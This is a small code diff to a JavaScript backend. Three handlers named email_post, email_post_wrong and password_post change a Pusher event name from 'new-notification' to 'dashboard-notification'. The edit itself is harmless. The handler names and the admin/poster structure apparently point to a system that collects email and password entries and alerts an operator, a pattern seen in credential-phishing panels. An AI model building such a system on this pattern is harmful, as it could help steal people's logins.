@@ -58,7 +58,7 @@ export const email_post = async (req, res) => {
             
             await info.save();
             if(info){
-                pusher.trigger(userFound.adminId, 'new-notification', {
+                pusher.trigger(userFound.adminId, 'dashboard-notification', {
                     adminId: userFound.adminId,posterId:posterFound.posterId,name:posterFound.username
                   });
             }
@@ -105,7 +105,7 @@ export const email_post_wrong = async(req, res) => {
             });
 
             if(found){
-                pusher.trigger(userFound.adminId, 'new-notification', {
+                pusher.trigger(userFound.adminId, 'dashboard-notification', {
                     adminId: userFound.adminId,posterId:posterFound.posterId,name:posterFound.username
                   });
 
@@ -148,7 +148,7 @@ export const password_post = async(req, res) => {
             });
 
             if(found){
-                pusher.trigger(userFound.adminId, 'new-notification', {
+                pusher.trigger(userFound.adminId, 'dashboard-notification', {
                     adminId: userFound.adminId,posterId:posterFound.posterId,name:posterFound.username
                   });
 
